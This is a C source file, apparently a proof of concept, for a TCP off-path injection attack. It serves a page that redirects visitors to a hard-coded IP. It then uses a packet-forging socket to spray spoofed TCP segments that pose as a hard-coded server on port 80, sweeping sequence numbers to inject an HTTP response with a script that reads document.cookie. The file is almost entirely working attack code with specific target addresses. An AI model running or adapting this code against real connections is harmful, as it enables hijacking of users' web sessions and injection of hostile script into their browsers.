#include <stdlib.h>
#include <event2/event.h>
#include <event2/event_struct.h>
#include <event2/listener.h>
#include <event2/bufferevent.h>
#include <event2/buffer.h>
#include <event2/util.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/queue.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include "forge_socket.h"
#include <string.h>
#include "tcp_spoof.h"

#define DEFAULT_SPORT   888

#define RESPONSE "HTTP/1.0 200 OK\r\nContent-Length: %d\r\nConnection: close\r\nContent-type: text/html;\r\n\r\n%s\n"

#define HTML_CODE "<html><h1>Hi</h1>Welcome to my TCP attack! (v0.0.1)\n" \
    "<iframe id=\"foo\" src=\"http://hobocomp.com/\"></iframe>\n" \
    "<script type=\"text/javascript\">setTimeout(function(){document.location=\"http://141.212.111.247:888/\";},200);</script></html>"

#define INJECT_HTTP "HTTP/1.1 200\nContent-Type: text/html;\n\n<script>alert(document.cookie);</script>\n"
#define INJECT_SIZE 1024
#define SEQ_STEP (5*INJECT_SIZE)

#define SERVER_IP "68.40.51.184"


void http_req_cb(struct bufferevent *bev, void *ctx)
{
    
    printf("sigh..\n");
    fflush(stdout);
    evbuffer_add(bufferevent_get_output(bev), RESPONSE, strlen(RESPONSE)); 
}

void tcp_events(struct bufferevent *bev, short events, void *ctx)
{
    return;
}

void on_read(int sock, short type, void *arg)
{
    printf("on_read(%d, %d, %p)\n", sock, type, arg);    
    
}

void echo_read_cb(struct bufferevent *bev, void *ctx)
{
    return;
}


void spoof_payload(struct sockaddr_in *sin, uint32_t seq_start)
{
    struct timeval start_time, cur_time;
    struct pkt_data pkt;
    char payload[INJECT_SIZE + 1];
    gettimeofday(&start_time, NULL);

    if (strlen(INJECT_HTTP) >= INJECT_SIZE) {
        fprintf(stderr, "INJECT_HTTP larger than INJECT_SIZE!\n");
        exit(1);
    }

    memset(payload, ' ', INJECT_SIZE);
    strncpy(&payload[INJECT_SIZE - strlen(INJECT_HTTP)], INJECT_HTTP, INJECT_SIZE);
    pkt.daddr = sin->sin_addr.s_addr;
    pkt.saddr = inet_addr(SERVER_IP);
    pkt.dport = sin->sin_port;
    pkt.sport = htons(80);
    
    pkt.ack = 0;
    pkt.seq = seq_start;
    pkt.flags = 0;
    pkt.window = 4096;
    pkt.id = 1234;

    int pkt_count = 0;
    
    do {  
        tcp_forge_xmit(&pkt, payload, SEQ_STEP);
        pkt.seq -= SEQ_STEP;
        pkt_count++;
        gettimeofday(&cur_time, NULL);
    } while (((cur_time.tv_sec - start_time.tv_sec)*1000 - 
              (cur_time.tv_usec - start_time.tv_usec)/1000) < 1000);
    printf("got %d packets off\n", pkt_count); 
}


void on_tcp_accept(struct evconnlistener *listener, 
                   evutil_socket_t sock, struct sockaddr *addr, int socklen, void *ptr)
{
    struct event_base *base = evconnlistener_get_base(listener);
    struct bufferevent *bev = bufferevent_socket_new(base, sock, BEV_OPT_CLOSE_ON_FREE|BEV_OPT_DEFER_CALLBACKS);
    bufferevent_setcb(bev, echo_read_cb, NULL, tcp_events, NULL);
    bufferevent_enable(bev, EV_READ|EV_WRITE);
    evbuffer_add_printf(bufferevent_get_output(bev), RESPONSE, strlen(HTML_CODE), HTML_CODE);

    struct sockaddr_in *sin = (struct sockaddr_in*)addr;

    printf("accept: %s:%d\n", inet_ntoa(sin->sin_addr), ntohs(sin->sin_port));

    spoof_payload(sin, 0xffffffff);
}


int main(int argc, char *argv[])
{
    int c;
    int sport = DEFAULT_SPORT;

    // Get options
    struct option opts[] = {
        {"sport", required_argument, NULL, 's'},
        {0, 0, 0, 0} };

    while ((c = getopt_long(argc, argv, "s:", opts, NULL)) != -1) {
        switch (c) {
        case 's':
            sport = atoi(optarg);
            if (sport < 0 || sport > 65535) {
                fprintf(stderr, "Error: invalid port %d\n", sport);
                return 1;
            }
            break;
        case '?':
        default:
            fprintf(stderr, "Error: need -s sport\n");
            return 1;
        }
    }

    
    struct event_base *base;
    int sock;
    struct sockaddr_in sin;


    init_sock();    // So we can spoof packets
    base = event_base_new();

    sock = socket(AF_INET, SOCK_FORGE, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));

    sin.sin_family      = AF_INET;
    sin.sin_addr.s_addr = inet_addr("0.0.0.0");
    sin.sin_port        = htons(sport);

    if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("bind");
        return -1;
    }
    fcntl(sock, F_SETFL, O_NONBLOCK); // Eh, ok.

/*
    if (listen(sock, 5) < 0) {
        perror("listen");
        return -1;
    }
*/
   
    struct evconnlistener *listener;
    listener = evconnlistener_new(base, on_tcp_accept, NULL, LEV_OPT_CLOSE_ON_FREE, -1, sock); 
    
    event_base_dump_events(base, stdout);

    event_base_dispatch(base);
    
    return 0;
}
